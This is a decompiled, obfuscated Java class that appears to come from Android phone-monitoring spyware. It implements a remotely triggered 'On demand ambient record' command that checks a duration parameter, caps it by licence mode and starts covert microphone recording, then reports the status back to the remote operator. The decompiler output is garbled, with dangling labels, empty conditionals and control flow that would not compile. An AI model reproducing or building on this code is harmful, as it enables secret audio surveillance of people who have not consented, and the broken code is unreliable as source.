package com.vvt.remotecommand.processor.d;

import com.vvt.base.RunningMode;
import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.exception.InvalidCommanFormatException;
import com.vvt.remotecommand.exception.RemoteCommandException;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;
import java.util.ArrayList;
import java.util.Iterator;

public class c
  extends RemoteCommandProcessor
{
  private static final boolean a = com.vvt.ak.a.a;
  
  public c(com.vvt.remotecontrol.a parama)
  {
    super(parama);
  }
  
  public void a(RemoteCommand paramRemoteCommand, com.vvt.remotecommand.processor.c paramc)
  {
    boolean bool1 = false;
    Object localObject1 = null;
    int i = 1;
    int j = a;
    if (j != 0) {}
    com.vvt.remotecontrol.a locala = h();
    Object localObject2 = new com/vvt/remotecontrol/ControlCommand;
    Object localObject3 = RemoteFunction.DEBUG_IS_RESUME_ON_DEMAND_AMBIENT_RECORDING;
    ((ControlCommand)localObject2).<init>((RemoteFunction)localObject3, null);
    localObject2 = (Boolean)locala.execute((ControlCommand)localObject2);
    boolean bool4 = ((Boolean)localObject2).booleanValue();
    j = a;
    if (j != 0) {}
    localObject2 = paramRemoteCommand.getParameters();
    a((ArrayList)localObject2);
    localObject2 = (String)((ArrayList)localObject2).get(0);
    int m = Integer.parseInt((String)localObject2);
    j = a;
    if ((j == 0) || (m < i))
    {
      j = a;
      if ((j == 0) || (paramc != null))
      {
        j = a;
        if (j != 0) {}
        localObject2 = "The recording duration must be between 1 and 60 minutes.\n";
        localObject3 = new com/vvt/remotecommand/exception/RemoteCommandException;
        ((RemoteCommandException)localObject3).<init>((String)localObject2);
        paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject3);
      }
      return;
    }
    localObject2 = new com/vvt/remotecontrol/ControlCommand;
    localObject3 = RemoteFunction.DEBUG_GET_APPLICATION_MODE;
    ((ControlCommand)localObject2).<init>((RemoteFunction)localObject3, null);
    localObject2 = (RunningMode)locala.execute((ControlCommand)localObject2);
    int n = 60;
    localObject1 = RunningMode.LIMITED_1;
    if (localObject2 != localObject1)
    {
      localObject1 = RunningMode.NORMAL;
      if (localObject2 != localObject1) {}
    }
    else
    {
      n = 15;
    }
    if (m > n)
    {
      bool1 = i;
      label245:
      if (!bool1) {
        break label618;
      }
    }
    boolean bool5;
    label527:
    boolean bool3;
    label618:
    for (j = n;; bool3 = bool5)
    {
      if (!bool4)
      {
        localObject4 = new java/lang/StringBuilder;
        String str = "The ambient recording is being processed.\n";
        ((StringBuilder)localObject4).<init>(str);
        if (bool1)
        {
          localObject1 = "The application will record for a maximum of %d minutes.\n";
          Object[] arrayOfObject = new Object[i];
          localObject3 = Integer.valueOf(n);
          arrayOfObject[0] = localObject3;
          localObject3 = String.format((String)localObject1, arrayOfObject);
          bool1 = a;
          if (bool1) {}
          ((StringBuilder)localObject4).append((String)localObject3);
        }
        localObject3 = "You will be receiving the result when it completes.\n";
        ((StringBuilder)localObject4).append((String)localObject3);
        if (paramc != null)
        {
          bool6 = a;
          if (bool6) {}
          localObject3 = ((StringBuilder)localObject4).toString();
          paramc.a(paramRemoteCommand, this, (String)localObject3);
        }
      }
      boolean bool6 = a;
      if (bool6) {}
      localObject3 = new com/vvt/remotecontrol/ControlCommand;
      Object localObject4 = RemoteFunction.ON_DEMAND_AMBIENT_RECORD;
      localObject2 = Integer.valueOf(j);
      ((ControlCommand)localObject3).<init>((RemoteFunction)localObject4, localObject2);
      boolean bool2 = a;
      if (bool2) {}
      localObject3 = locala.execute((ControlCommand)localObject3);
      if (paramc != null)
      {
        bool2 = localObject3 instanceof RmtCtrlOutputStatusMessage;
        if (bool2)
        {
          localObject2 = localObject3;
          localObject2 = (RmtCtrlOutputStatusMessage)localObject3;
          bool2 = ((RmtCtrlOutputStatusMessage)localObject2).isSuccess();
          localObject3 = ((RmtCtrlOutputStatusMessage)localObject3).getMessage();
          bool5 = a;
          if (bool5) {}
          bool5 = a;
          if ((bool5) && (!bool2)) {
            break label527;
          }
          paramc.b(paramRemoteCommand, this, (String)localObject3);
        }
      }
      for (;;)
      {
        bool2 = a;
        if (!bool2) {
          break;
        }
        break;
        bool1 = false;
        localObject1 = null;
        break label245;
        if (localObject3 != null)
        {
          int k = ((String)localObject3).length();
          if (k > 0)
          {
            bool3 = a;
            if (bool3) {}
            localObject2 = new com/vvt/remotecommand/exception/RemoteCommandException;
            ((RemoteCommandException)localObject2).<init>((String)localObject3);
            paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject2);
            continue;
          }
        }
        bool3 = a;
        if (bool3) {}
        localObject2 = new com/vvt/remotecommand/exception/RemoteCommandException;
        localObject3 = "Unknown.";
        ((RemoteCommandException)localObject2).<init>((String)localObject3);
        paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject2);
      }
    }
  }
  
  void a(ArrayList paramArrayList)
  {
    boolean bool1 = a;
    if (bool1) {}
    int i = paramArrayList.size();
    int j = 1;
    boolean bool2;
    Object localObject;
    if (i != j)
    {
      bool2 = a;
      if (bool2) {}
      localObject = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      ((InvalidCommanFormatException)localObject).<init>();
      throw ((Throwable)localObject);
    }
    try
    {
      Iterator localIterator = paramArrayList.iterator();
      for (;;)
      {
        bool2 = localIterator.hasNext();
        if (!bool2) {
          break;
        }
        localObject = localIterator.next();
        localObject = (String)localObject;
        Integer.parseInt((String)localObject);
      }
      InvalidCommanFormatException localInvalidCommanFormatException;
      return;
    }
    catch (NumberFormatException localNumberFormatException)
    {
      localInvalidCommanFormatException = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      localInvalidCommanFormatException.<init>();
      throw localInvalidCommanFormatException;
    }
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return "On demand ambient record";
  }
  
  public boolean f()
  {
    return true;
  }
  
  public long g()
  {
    return 0L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/d/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */